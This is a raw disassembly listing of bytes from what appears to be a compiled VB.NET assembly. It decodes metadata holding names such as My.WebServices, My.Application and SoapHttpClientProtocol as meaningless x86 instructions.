  40c0ca:	00 13                	add    %dl,(%ebx)
  40c0cc:	01 00                	add    %eax,(%eax)
  40c0ce:	0e                   	push   %cs
  40c0cf:	4d                   	dec    %ebp
  40c0d0:	79 2e                	jns    0x40c100
  40c0d2:	57                   	push   %edi
  40c0d3:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  40c0d7:	72 76                	jb     0x40c14f
  40c0d9:	69 63 65 73 00 00 10 	imul   $0x10000073,0x65(%ebx),%esp
  40c0e0:	01 00                	add    %eax,(%eax)
  40c0e2:	0b 4d 79             	or     0x79(%ebp),%ecx
  40c0e5:	2e 43                	cs inc %ebx
  40c0e7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0e8:	6d                   	insl   (%dx),%es:(%edi)
  40c0e9:	70 75                	jo     0x40c160
  40c0eb:	74 65                	je     0x40c152
  40c0ed:	72 00                	jb     0x40c0ef
  40c0ef:	00 13                	add    %dl,(%ebx)
  40c0f1:	01 00                	add    %eax,(%eax)
  40c0f3:	0e                   	push   %cs
  40c0f4:	4d                   	dec    %ebp
  40c0f5:	79 2e                	jns    0x40c125
  40c0f7:	41                   	inc    %ecx
  40c0f8:	70 70                	jo     0x40c16a
  40c0fa:	6c                   	insb   (%dx),%es:(%edi)
  40c0fb:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40c102:	00 00                	add    %al,(%eax)
  40c104:	04 00                	add    $0x0,%al
  40c106:	01 1c 1c             	add    %ebx,(%esp,%ebx,1)
  40c109:	03 07                	add    (%edi),%eax
  40c10b:	01 02                	add    %eax,(%edx)
  40c10d:	03 07                	add    (%edi),%eax
  40c10f:	01 08                	add    %ecx,(%eax)
  40c111:	06                   	push   %es
  40c112:	00 01                	add    %al,(%ecx)
  40c114:	12 15 11 79 04 07    	adc    0x7047911,%dl
  40c11a:	01 12                	add    %edx,(%edx)
  40c11c:	15 03 07 01 0e       	adc    $0xe010703,%eax
  40c121:	05 10 01 00 1e       	add    $0x1e000110,%eax
  40c126:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c129:	01 1e                	add    %ebx,(%esi)
  40c12b:	00 04 07             	add    %al,(%edi,%eax,1)
  40c12e:	01 1e                	add    %ebx,(%esi)
  40c130:	00 07                	add    %al,(%edi)
  40c132:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c135:	0e                   	push   %cs
  40c136:	0e                   	push   %cs
  40c137:	0e                   	push   %cs
  40c138:	0e                   	push   %cs
  40c139:	61                   	popa
  40c13a:	01 00                	add    %eax,(%eax)
  40c13c:	34 53                	xor    $0x53,%al
  40c13e:	79 73                	jns    0x40c1b3
  40c140:	74 65                	je     0x40c1a7
  40c142:	6d                   	insl   (%dx),%es:(%edi)
  40c143:	2e 57                	cs push %edi
  40c145:	65 62 2e             	bound  %ebp,%gs:(%esi)
  40c148:	53                   	push   %ebx
  40c149:	65 72 76             	gs jb  0x40c1c2
  40c14c:	69 63 65 73 2e 50 72 	imul   $0x72502e73,0x65(%ebx),%esp
  40c153:	6f                   	outsl  %ds:(%esi),(%dx)
  40c154:	74 6f                	je     0x40c1c5
  40c156:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40c159:	73 2e                	jae    0x40c189
  40c15b:	53                   	push   %ebx
  40c15c:	6f                   	outsl  %ds:(%esi),(%dx)
  40c15d:	61                   	popa
  40c15e:	70 48                	jo     0x40c1a8
  40c160:	74 74                	je     0x40c1d6
  40c162:	70 43                	jo     0x40c1a7
  40c164:	6c                   	insb   (%dx),%es:(%edi)
  40c165:	69 65 6e 74 50 72 6f 	imul   $0x6f725074,0x6e(%ebp),%esp
  40c16c:	74 6f                	je     0x40c1dd
  40c16e:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40c171:	12 43 72             	adc    0x72(%ebx),%al
  40c174:	65 61                	gs popa
  40c176:	74 65                	je     0x40c1dd
  40c178:	5f                   	pop    %edi
  40c179:	5f                   	pop    %edi
  40c17a:	49                   	dec    %ecx
  40c17b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c17c:	73 74                	jae    0x40c1f2
  40c17e:	61                   	popa
  40c17f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c180:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  40c183:	5f                   	pop    %edi
  40c184:	13 44 69 73          	adc    0x73(%ecx,%ebp,2),%eax
  40c188:	70 6f                	jo     0x40c1f9
  40c18a:	73 65                	jae    0x40c1f1
  40c18c:	5f                   	pop    %edi
  40c18d:	5f                   	pop    %edi
  40c18e:	49                   	dec    %ecx
  40c18f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c190:	73 74                	jae    0x40c206
  40c192:	61                   	popa
  40c193:	6e                   	outsb  %ds:(%esi),(%dx)
  40c194:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  40c197:	5f                   	pop    %edi
  40c198:	00 00                	add    %al,(%eax)
  40c19a:	00 06                	add    %al,(%esi)
  40c19c:	15 12 18 01 13       	adc    $0x13011812,%eax
  40c1a1:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c1a4:	01 13                	add    %edx,(%ebx)
  40c1a6:	00 04 07             	add    %al,(%edi,%eax,1)
  40c1a9:	01 13                	add    %edx,(%ebx)
  40c1ab:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c1ae:	01 01                	add    %eax,(%ecx)
  40c1b0:	02 05 01 00 00 00    	add    0x1,%al
  40c1b6:	00 04 00             	add    %al,(%eax,%eax,1)
  40c1b9:	01 08                	add    %ecx,(%eax)
  40c1bb:	0e                   	push   %cs
  40c1bc:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c1c1:	0e                   	push   %cs
  40c1c2:	07                   	pop    %es
  40c1c3:	20 02                	and    %al,(%edx)
  40c1c5:	12 29                	adc    (%ecx),%ch
  40c1c7:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c1ca:	05 20 01 01 12       	add    $0x12010120,%eax
  40c1cf:	29 31                	sub    %esi,(%ecx)
  40c1d1:	01 00                	add    %eax,(%eax)
  40c1d3:	12 3c 67             	adc    (%edi,%eiz,2),%bh
  40c1d6:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c1d8:	65 72 61             	gs jb  0x40c23c
  40c1db:	74 65                	je     0x40c242
  40c1dd:	64 20 6d 65          	and    %ch,%fs:0x65(%ebp)
  40c1e1:	74 68                	je     0x40c24b
  40c1e3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1e4:	64 3e 01 00          	fs add %eax,%ds:(%eax)
  40c1e8:	54                   	push   %esp
  40c1e9:	0e                   	push   %cs
  40c1ea:	04 54                	add    $0x54,%al
  40c1ec:	79 70                	jns    0x40c25e
  40c1ee:	65 12 3c 67          	adc    %gs:(%edi,%eiz,2),%bh
  40c1f2:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c1f4:	65 72 61             	gs jb  0x40c258
  40c1f7:	74 65                	je     0x40c25e
  40c1f9:	64 20 6d 65          	and    %ch,%fs:0x65(%ebp)
  40c1fd:	74 68                	je     0x40c267
  40c1ff:	6f                   	outsl  %ds:(%esi),(%dx)
  40c200:	64 3e 04 00          	fs ds add $0x0,%al
  40c204:	01 01                	add    %eax,(%ecx)
  40c206:	08 04 00             	or     %al,(%eax,%eax,1)
  40c209:	01 0e                	add    %ecx,(%esi)
  40c20b:	1c 06                	sbb    $0x6,%al
  40c20d:	00 01                	add    %al,(%ecx)
  40c20f:	01 12                	add    %edx,(%edx)
  40c211:	80 a5 06 00 03 0e 0e 	andb   $0xe,0xe030006(%ebp)
  40c218:	0e                   	push   %cs
  40c219:	0e                   	push   %cs
  40c21a:	05 20 00 12 80       	add    $0x80120020,%eax
  40c21f:	bd 06 00 01 12       	mov    $0x12010006,%ebp
  40c224:	80 bd 0e 06 20 01 01 	cmpb   $0x1,0x120060e(%ebp)
  40c22b:	11 80 c9 05 00 01    	adc    %eax,0x10005c9(%eax)
  40c231:	0e                   	push   %cs
  40c232:	1d 0e 08 00 01       	sbb    $0x100080e,%eax
  40c237:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  40c23d:	05 20 00 12 80       	add    $0x80120020,%eax
  40c242:	d5 05                	aad    $0x5
  40c244:	20 00                	and    %al,(%eax)
  40c246:	12 80 d9 07 20 02    	adc    0x22007d9(%eax),%al
  40c24c:	12 80 d9 0e 02 05    	adc    0x5020ed9(%eax),%al
  40c252:	20 02                	and    %al,(%edx)
  40c254:	01 0e                	add    %ecx,(%esi)
  40c256:	1c 06                	sbb    $0x6,%al
  40c258:	00 01                	add    %al,(%ecx)
  40c25a:	0e                   	push   %cs
  40c25b:	11 80 dd 07 00 04    	adc    %eax,0x40007dd(%eax)
  40c261:	0e                   	push   %cs
  40c262:	0e                   	push   %cs
  40c263:	0e                   	push   %cs
  40c264:	0e                   	push   %cs
  40c265:	0e                   	push   %cs
  40c266:	05 00 02 1c 0e       	add    $0xe1c0200,%eax
  40c26b:	0e                   	push   %cs
  40c26c:	10 00                	adc    %al,(%eax)
  40c26e:	07                   	pop    %es
  40c26f:	1c 1c                	sbb    $0x1c,%al
  40c271:	12 15 0e 1d 1c 1d    	adc    0x1d1c1d0e,%dl
  40c277:	0e                   	push   %cs
  40c278:	1d 12 15 1d 02       	sbb    $0x21d1512,%eax
  40c27d:	06                   	push   %es
  40c27e:	00 02                	add    %al,(%edx)
  40c280:	1c 1c                	sbb    $0x1c,%al
  40c282:	12 15 10 00 08 01    	adc    0x1080010,%dl
  40c288:	1c 12                	sbb    $0x12,%al
  40c28a:	15 0e 1d 1c 1d       	adc    $0x1d1c1d0e,%eax
  40c28f:	0e                   	push   %cs
  40c290:	1d 12 15 02 02       	sbb    $0x2021512,%eax
  40c295:	11 00                	adc    %eax,(%eax)
  40c297:	08 1c 1c             	or     %bl,(%esp,%ebx,1)
  40c29a:	12 15 0e 1d 1c 1d    	adc    0x1d1c1d0e,%dl
  40c2a0:	0e                   	push   %cs
  40c2a1:	1d 12 15 1d 02       	sbb    $0x21d1512,%eax
  40c2a6:	02 07                	add    (%edi),%al
  40c2a8:	20 02                	and    %al,(%edx)
  40c2aa:	01 0e                	add    %ecx,(%esi)
  40c2ac:	11 80 e9 06 20 01    	adc    %eax,0x12006e9(%eax)
  40c2b2:	01 12                	add    %edx,(%edx)
  40c2b4:	80 ed 2f             	sub    $0x2f,%ch
  40c2b7:	07                   	pop    %es
  40c2b8:	14 0e                	adc    $0xe,%al
  40c2ba:	12 2d 12 2d 12 80    	adc    0x80122d12,%ch
  40c2c0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c2c1:	12 80 a5 1c 12 80    	adc    -0x7fede35b(%eax),%al
  40c2c7:	a9 12 80 a5 12       	test   $0x12a58012,%eax
  40c2cc:	80 ad 12 80 b1 12 80 	subb   $0x80,0x12b18012(%ebp)
  40c2d3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c2d4:	12 80 a5 0e 12 80    	adc    -0x7fedf15b(%eax),%al
  40c2da:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c2db:	1d 0e 1d 1c 1d       	sbb    $0x1d1c1d0e,%eax
  40c2e0:	1c 1d                	sbb    $0x1d,%al
  40c2e2:	02 1c 1d 1c 05 00 00 	add    0x51c(,%ebx,1),%bl
  40c2e9:	12 80 ad 05 20 00    	adc    0x2005ad(%eax),%al
  40c2ef:	12 80 f1 0a 07 03    	adc    0x3070af1(%eax),%al
  40c2f5:	12 80 b1 12 80 a5    	adc    -0x5a7fed4f(%eax),%al
  40c2fb:	1d 0e 04 20 01       	sbb    $0x120040e,%eax
  40c300:	0e                   	push   %cs
  40c301:	0e                   	push   %cs
  40c302:	04 20                	add    $0x20,%al
  40c304:	01 02                	add    %eax,(%edx)
  40c306:	0e                   	push   %cs
  40c307:	04 07                	add    $0x7,%al
  40c309:	02 02                	add    (%edx),%al
  40c30b:	0e                   	push   %cs
  40c30c:	05 20 00 12 80       	add    $0x80120020,%eax
  40c311:	fd                   	std
  40c312:	03 20                	add    (%eax),%esp
  40c314:	00 1c 08             	add    %bl,(%eax,%ecx,1)
  40c317:	00 03                	add    %al,(%ebx)
  40c319:	1c 1c                	sbb    $0x1c,%al
  40c31b:	1d 1c 1d 0e 06       	sbb    $0x60e1d1c,%eax
  40c320:	00 03                	add    %al,(%ebx)
  40c322:	08 0e                	or     %cl,(%esi)
  40c324:	0e                   	push   %cs
  40c325:	02 03                	add    (%ebx),%al
  40c327:	20 00                	and    %al,(%eax)
  40c329:	02 0e                	add    (%esi),%cl
  40c32b:	07                   	pop    %es
  40c32c:	08 02                	or     %al,(%edx)
  40c32e:	1c 1c                	sbb    $0x1c,%al
  40c330:	1c 0e                	sbb    $0xe,%al
  40c332:	12 80 fd 1d 1c 1d    	adc    0x1d1c1dfd(%eax),%al
  40c338:	1c 03                	sbb    $0x3,%al
  40c33a:	20 00                	and    %al,(%eax)
  40c33c:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c33f:	02 02                	add    (%edx),%al
  40c341:	02 04 07             	add    (%edi,%eax,1),%al
  40c344:	02 02                	add    (%edx),%al
  40c346:	18 05 20 02 08 08    	sbb    %al,0x8080220
  40c34c:	08 06                	or     %al,(%esi)
  40c34e:	20 01                	and    %al,(%ecx)
  40c350:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c355:	20 01                	and    %al,(%ecx)
  40c357:	08 08                	or     %cl,(%eax)
  40c359:	07                   	pop    %es
  40c35a:	00 01                	add    %al,(%ecx)
  40c35c:	1d 12 81 21 0e       	sbb    $0xe218112,%eax
  40c361:	16                   	push   %ss
  40c362:	07                   	pop    %es
  40c363:	08 0e                	or     %cl,(%esi)
  40c365:	1d 12 81 21 12       	sbb    $0x12218112,%eax
  40c36a:	81 21 12 80 a5 1d    	andl   $0x1da58012,(%ecx)
  40c370:	03 1d 03 08 1d 12    	add    0x121d0803,%ebx
  40c376:	81 21 0c 20 03 01    	andl   $0x103200c,(%ecx)
  40c37c:	11 81 31 11 81 35    	adc    %eax,0x35811131(%ecx)
  40c382:	11 81 39 04 20 01    	adc    %eax,0x1200439(%ecx)
  40c388:	01 08                	add    %ecx,(%eax)
  40c38a:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c38f:	08 0e                	or     %cl,(%esi)
  40c391:	20 06                	and    %al,(%esi)
  40c393:	12 29                	adc    (%ecx),%ch
  40c395:	1d 05 08 08 11       	sbb    $0x11080805,%eax
  40c39a:	81 41 12 4d 1c 09 20 	addl   $0x20091c4d,0x12(%ecx)
  40c3a1:	04 01                	add    $0x1,%al
  40c3a3:	12 81 2d 1c 08 08    	adc    0x8081c2d(%ecx),%al
  40c3a9:	09 07                	or     %eax,(%edi)
  40c3ab:	03 1c 12             	add    (%edx,%edx,1),%ebx
  40c3ae:	81 2d 12 80 a5 05 20 	subl   $0xe0e0220,0x5a58012
  40c3b5:	02 0e 0e 
  40c3b8:	0e                   	push   %cs
  40c3b9:	05 00 00 12 81       	add    $0x81120000,%eax
  40c3be:	49                   	dec    %ecx
  40c3bf:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c3c4:	1c 09                	sbb    $0x9,%al
  40c3c6:	07                   	pop    %es
  40c3c7:	04 1c                	add    $0x1c,%al
  40c3c9:	12 80 f9 02 1d 1c    	adc    0x1c1d02f9(%eax),%al
  40c3cf:	05 20 00 11 81       	add    $0x81110020,%eax
  40c3d4:	4d                   	dec    %ebp
  40c3d5:	0c 07                	or     $0x7,%al
  40c3d7:	04 0e                	add    $0xe,%al
  40c3d9:	12 80 a9 12 80 a5    	adc    -0x5a7fed57(%eax),%al
  40c3df:	11 81 4d 06 07 02    	adc    %eax,0x207064d(%ecx)
  40c3e5:	0e                   	push   %cs
  40c3e6:	12 80 a5 05 00 00    	adc    0x5a5(%eax),%al
  40c3ec:	12 81 55 06 20 01    	adc    0x1200655(%ecx),%al
  40c3f2:	01 12                	add    %edx,(%edx)
  40c3f4:	81 55 06 20 01 02 11 	adcl   $0x11020120,0x6(%ebp)
  40c3fb:	81 5d 07 07 03 0e 12 	sbbl   $0x120e0307,0x7(%ebp)
  40c402:	80 a5 02 05 20 00 12 	andb   $0x12,0x200502(%ebp)
  40c409:	81 65 05 20 00 12 81 	andl   $0x81120020,0x5(%ebp)
  40c410:	69 05 20 00 12 81 61 	imul   $0x1200461,0x81120020,%eax
  40c417:	04 20 01 
  40c41a:	1c 0e                	sbb    $0xe,%al
  40c41c:	05 20 01 12 31       	add    $0x31120120,%eax
  40c421:	0e                   	push   %cs
  40c422:	05 20 02 0e 08       	add    $0x80e0220,%eax
  40c427:	08 11                	or     %dl,(%ecx)
  40c429:	07                   	pop    %es
  40c42a:	06                   	push   %es
  40c42b:	0e                   	push   %cs
  40c42c:	12 81 01 12 31 12    	adc    0x12311201(%ecx),%al
  40c432:	81 61 12 80 a5 12 81 	andl   $0x8112a580,0x12(%ecx)
  40c439:	69 06 20 01 01 12    	imul   $0x12010120,(%esi),%eax
  40c43f:	81 6d 05 00 02 1c 1c 	subl   $0x1c1c0200,0x5(%ebp)
  40c446:	1c 10                	sbb    $0x10,%al
  40c448:	07                   	pop    %es
  40c449:	06                   	push   %es
  40c44a:	0e                   	push   %cs
  40c44b:	12 81 6d 12 81 01    	adc    0x181126d(%ecx),%al
  40c451:	0e                   	push   %cs
  40c452:	12 81 71 12 81 69    	adc    0x69811271(%ecx),%al
  40c458:	09 07                	or     %eax,(%edi)
  40c45a:	03 0e                	add    (%esi),%ecx
  40c45c:	12 81 71 12 80 a5    	adc    -0x5a7fed8f(%ecx),%al
  40c462:	05 20 00 12 80       	add    $0x80120020,%eax
  40c467:	f9                   	stc
  40c468:	03 20                	add    (%eax),%esp
  40c46a:	00 0b                	add    %cl,(%ebx)
  40c46c:	04 00                	add    $0x0,%al
  40c46e:	01 0d 1c 04 00 01    	add    %ecx,0x100041c
  40c474:	0d 0d 09 07 05       	or     $0x507090d,%eax
  40c479:	0e                   	push   %cs
  40c47a:	0a 0e                	or     (%esi),%cl
  40c47c:	12 80 a5 0d 05 20    	adc    0x20050da5(%eax),%al
  40c482:	01 08                	add    %ecx,(%eax)
  40c484:	12 29                	adc    (%ecx),%ch
  40c486:	04 20                	add    $0x20,%al
  40c488:	00 1d 05 04 00 01    	add    %bl,0x1000405
  40c48e:	0a 0e                	or     (%esi),%cl
  40c490:	04 20                	add    $0x20,%al
  40c492:	01 01                	add    %eax,(%ecx)
  40c494:	05 07 20 03 01       	add    $0x1032007,%eax
  40c499:	1d 05 08 08 03       	sbb    $0x3080805,%eax
  40c49e:	20 00                	and    %al,(%eax)
  40c4a0:	0a 06                	or     (%esi),%al
  40c4a2:	20 01                	and    %al,(%ecx)
  40c4a4:	01 12                	add    %edx,(%edx)
  40c4a6:	81 89 09 07 04 08 1c 	orl    $0xa580121c,0x8040709(%ecx)
  40c4ad:	12 80 a5 
  40c4b0:	1d 1c 05 07 01       	sbb    $0x107051c,%eax
  40c4b5:	12 80 a5 06 00 02    	adc    0x20006a5(%eax),%al
  40c4bb:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c4be:	02 07                	add    (%edi),%al
  40c4c0:	20 02                	and    %al,(%edx)
  40c4c2:	02 08                	add    (%eax),%cl
  40c4c4:	11 81 95 0d 07 06    	adc    %eax,0x6070d95(%ecx)
  40c4ca:	12 1d 1d 05 1d 05    	adc    0x51d051d,%bl
  40c4d0:	12 80 a5 1c 02 0e    	adc    0xe021ca5(%eax),%al
  40c4d6:	07                   	pop    %es
  40c4d7:	04 12                	add    $0x12,%al
  40c4d9:	80 a5 12 80 a5 12 80 	andb   $0x80,0x12a58012(%ebp)
  40c4e0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c4e1:	12 80 a5 07 07 02    	adc    0x20707a5(%eax),%al
  40c4e7:	12 80 a5 1d 0e 02    	adc    0x20e1da5(%eax),%al
  40c4ed:	1d 05 0a 00 04       	sbb    $0x4000a05,%eax
  40c4f2:	1d 0e 0e 0e 08       	sbb    $0x80e0e0e,%eax
  40c4f7:	11 81 b1 06 20 01    	adc    %eax,0x12006b1(%ecx)
  40c4fd:	01 11                	add    %edx,(%ecx)
  40c4ff:	81 b9 04 00 01 01 02 	cmpl   $0x1000602,0x1010004(%ecx)
  40c506:	06 00 01 
  40c509:	01 11                	add    %edx,(%ecx)
  40c50b:	81 c5 06 00 01 12    	add    $0x12010006,%ebp
  40c511:	80 ad 0e 09 00 04 08 	subb   $0x8,0x400090e(%ebp)
  40c518:	0e                   	push   %cs
  40c519:	11 81 c9 02 08 04    	adc    %eax,0x40802c9(%ecx)
  40c51f:	20 01                	and    %al,(%ecx)
  40c521:	01 1c 05 00 02 01 0e 	add    %ebx,0xe010200(,%eax,1)
  40c528:	0e                   	push   %cs
  40c529:	05 00 00 12 81       	add    $0x81120000,%eax
  40c52e:	cd 05                	int    $0x5
  40c530:	20 00                	and    %al,(%eax)
  40c532:	11 81 a5 08 20 03    	adc    %eax,0x32008a5(%ecx)
  40c538:	01 08                	add    %ecx,(%eax)
  40c53a:	08 11                	or     %dl,(%ecx)
  40c53c:	81 d1 08 00 01 12    	adc    $0x12010008,%ecx
  40c542:	81 9d 12 81 d5 05 20 	sbbl   $0x8010220,0x5d58112(%ebp)
  40c549:	02 01 08 
  40c54c:	08 0d 20 06 01 08    	or     %cl,0x8010620
  40c552:	08 08                	or     %cl,(%eax)
  40c554:	08 11                	or     %dl,(%ecx)
  40c556:	81 a1 11 81 d9 07 20 	andl   $0x8010420,0x7d98111(%ecx)
  40c55d:	04 01 08 
  40c560:	08 08                	or     %cl,(%eax)
  40c562:	08 0f                	or     %cl,(%edi)
  40c564:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c567:	12 81 d5 11 81 a5    	adc    -0x5a7eee2b(%ecx),%al
  40c56d:	11 81 a5 11 81 dd    	adc    %eax,-0x227eee5b(%ecx)
  40c573:	05 00 00 12 81       	add    $0x81120000,%eax
  40c578:	e1 09                	loope  0x40c583
  40c57a:	20 02                	and    %al,(%edx)
  40c57c:	01 12                	add    %edx,(%edx)
  40c57e:	81 85 12 81 e1 43 07 	addl   $0xe1d1907,0x43e18112(%ebp)
  40c585:	19 1d 0e 
  40c588:	0e                   	push   %cs
  40c589:	12 80 f5 12 80 a5    	adc    -0x5a7fed0b(%eax),%al
  40c58f:	12 80 a5 12 80 a5    	adc    -0x5a7fed5b(%eax),%al
  40c595:	12 80 a5 0e 12 80    	adc    -0x7fedf15b(%eax),%al
  40c59b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c59c:	1d 05 12 81 9d       	sbb    $0x9d811205,%eax
  40c5a1:	11 81 a1 11 81 a5    	adc    %eax,-0x5a7eee5f(%ecx)
  40c5a7:	12 81 9d 12 81 a9    	adc    -0x567eed63(%ecx),%al
  40c5ad:	12 1d 12 81 a9 12    	adc    0x12a98112,%bl
  40c5b3:	80 a5 12 80 a5 0e 1d 	andb   $0x1d,0xea58012(%ebp)
  40c5ba:	0e                   	push   %cs
  40c5bb:	11 81 a5 11 81 a5    	adc    %eax,-0x5a7eee5b(%ecx)
  40c5c1:	11 81 a5 11 81 a5    	adc    %eax,-0x5a7eee5b(%ecx)
  40c5c7:	05 00 00 12 81       	add    $0x81120000,%eax
  40c5cc:	e9 07 20 01 12       	jmp    0x1241e5d8
  40c5d1:	81 ed 1d 05 05 20    	sub    $0x2005051d,%ebp
  40c5d7:	00 1d 12 15 06 20    	add    %bl,0x20061512
  40c5dd:	00 1d 12 81 e5 06    	add    %bl,0x6e58112
  40c5e3:	00 03                	add    %al,(%ebx)
  40c5e5:	02 1c 1c             	add    (%esp,%ebx,1),%bl
  40c5e8:	02 16                	add    (%esi),%dl
  40c5ea:	07                   	pop    %es
  40c5eb:	0a 12                	or     (%edx),%dl
  40c5ed:	15 1c 0e 12 80       	adc    $0x80120e1c,%eax
  40c5f2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c5f3:	08 1d 12 15 08 1d    	or     %bl,0x1d081512
  40c5f9:	12 81 e5 1d 1c 1d    	adc    0x1d1c1de5(%ecx),%al
  40c5ff:	1c 05                	sbb    $0x5,%al
  40c601:	00 01                	add    %al,(%ecx)
  40c603:	11 41 0d             	adc    %eax,0xd(%ecx)
  40c606:	04 20                	add    $0x20,%al
  40c608:	00 11                	add    %dl,(%ecx)
  40c60a:	41                   	inc    %ecx
  40c60b:	07                   	pop    %es
  40c60c:	00 02                	add    %al,(%edx)
  40c60e:	02 11                	add    (%ecx),%dl
  40c610:	41                   	inc    %ecx
  40c611:	11 41 14             	adc    %eax,0x14(%ecx)
  40c614:	07                   	pop    %es
  40c615:	09 12                	or     %edx,(%edx)
  40c617:	54                   	push   %esp
  40c618:	12 81 f9 08 11 41    	adc    0x411108f9(%ecx),%al
  40c61e:	12 2d 08 12 80 a5    	adc    0xa5801208,%ch
  40c624:	1d 03 1d 0e 06       	sbb    $0x60e1d03,%eax
  40c629:	15 12 81 fd 01       	adc    $0x1fd8112,%eax
  40c62e:	0e                   	push   %cs
  40c62f:	05 20 01 01 13       	add    $0x13010120,%eax
  40c634:	00 06                	add    %al,(%esi)
  40c636:	00 00                	add    %al,(%eax)
  40c638:	1d 12 80 ad 07       	sbb    $0x7ad8012,%eax
  40c63d:	15 12 82 01 02       	adc    $0x2018212,%eax
  40c642:	0e                   	push   %cs
  40c643:	02 13                	add    (%ebx),%dl
  40c645:	10 01                	adc    %al,(%ecx)
  40c647:	02 02                	add    (%edx),%al
  40c649:	15 12 82 09 01       	adc    $0x1098212,%eax
  40c64e:	1e                   	push   %ds
  40c64f:	00 15 12 82 01 02    	add    %dl,0x2018212
  40c655:	1e                   	push   %ds
  40c656:	00 02                	add    %al,(%edx)
  40c658:	03 0a                	add    (%edx),%ecx
  40c65a:	01 0e                	add    %ecx,(%esi)
  40c65c:	15 07 08 08 1c       	adc    $0x1c080807,%eax
  40c661:	15 12 81 fd 01       	adc    $0x1fd8112,%eax
  40c666:	0e                   	push   %cs
  40c667:	12 80 ad 08 1d 0e    	adc    0xe1d08ad(%eax),%al
  40c66d:	08 1d 12 80 ad 06    	or     %bl,0x6ad8012
  40c673:	00 01                	add    %al,(%ecx)
  40c675:	12 82 15 0e 05 20    	adc    0x20050e15(%edx),%al
  40c67b:	00 12                	add    %dl,(%edx)
  40c67d:	82 19 08             	sbbb   $0x8,(%ecx)
  40c680:	07                   	pop    %es
  40c681:	02 12                	add    (%edx),%dl
  40c683:	82 0d 12 82 11 09 07 	orb    $0x7,0x9118212
  40c68a:	05 02 08 0e 12       	add    $0x120e0802,%eax
  40c68f:	80 a5 0e 0f 07 06 1c 	andb   $0x1c,0x6070f0e(%ebp)
  40c696:	12 80 ad 12 80 b1    	adc    -0x4e7fed53(%eax),%al
  40c69c:	1d 1c 1d 1c 1d       	sbb    $0x1d1c1d1c,%eax
  40c6a1:	02 05 20 00 12 81    	add    0x81120020,%al
  40c6a7:	e5 06                	in     $0x6,%eax
  40c6a9:	20 00                	and    %al,(%eax)
  40c6ab:	1d 12 82 21 06       	sbb    $0x6218212,%eax
  40c6b0:	20 02                	and    %al,(%edx)
  40c6b2:	1c 1c                	sbb    $0x1c,%al
  40c6b4:	1d 1c 0f 07 06       	sbb    $0x6070f1c,%eax
  40c6b9:	1c 12                	sbb    $0x12,%al
  40c6bb:	81 ed 1c 12 81 e5    	sub    $0xe581121c,%ebp
  40c6c1:	1d 1c 12 80 a5       	sbb    $0xa580121c,%eax
  40c6c6:	05 00 00 12 82       	add    $0x82120000,%eax
  40c6cb:	25 05 20 01 1d       	and    $0x1d012005,%eax
  40c6d0:	05 0e 0a 20 04       	add    $0x4200a0e,%eax
  40c6d5:	08 1d 05 08 08 11    	or     %bl,0x11080805
  40c6db:	81 41 0c 07 05 1d 05 	addl   $0x51d0507,0xc(%ecx)
  40c6e2:	0e                   	push   %cs
  40c6e3:	12 19                	adc    (%ecx),%bl
  40c6e5:	12 80 a5 1d 0e 06    	adc    0x60e1da5(%eax),%al
  40c6eb:	20 01                	and    %al,(%ecx)
  40c6ed:	01 11                	add    %edx,(%ecx)
  40c6ef:	82 2d 01 22 04 06 12 	subb   $0x12,0x6042201
  40c6f6:	80 d9 05             	sbb    $0x5,%cl
  40c6f9:	20 02                	and    %al,(%edx)
  40c6fb:	01 0e                	add    %ecx,(%esi)
  40c6fd:	02 06                	add    (%esi),%al
  40c6ff:	00 00                	add    %al,(%eax)
  40c701:	1d 12 82 31 05       	sbb    $0x5318212,%eax
  40c706:	20 00                	and    %al,(%eax)
  40c708:	11 82 3d 06 00 02    	adc    %eax,0x200063d(%edx)
  40c70e:	1d 0e 0e 0e 37       	sbb    $0x370e0e0e,%eax
  40c713:	07                   	pop    %es
  40c714:	16                   	push   %ss
  40c715:	12 80 a5 12 80 a5    	adc    -0x5a7fed5b(%eax),%al
  40c71b:	12 80 d9 12 80 a5    	adc    -0x5a7fed27(%eax),%al
  40c721:	12 80 a5 0e 12 80    	adc    -0x7fedf15b(%eax),%al
  40c727:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c728:	12 82 31 0e 1d 0e    	adc    0xe1d0e31(%edx),%al
  40c72e:	1c 12                	sbb    $0x12,%al
  40c730:	80 a5 12 80 a5 12 80 	andb   $0x80,0x12a58012(%ebp)
  40c737:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c738:	0e                   	push   %cs
  40c739:	12 82 35 12 80 a5    	adc    -0x5a7fedcb(%edx),%al
  40c73f:	12 80 b1 08 1d 12    	adc    0x121d08b1(%eax),%al
  40c745:	82 31 08             	xorb   $0x8,(%ecx)
  40c748:	1d 0e 07 20 02       	sbb    $0x220070e,%eax
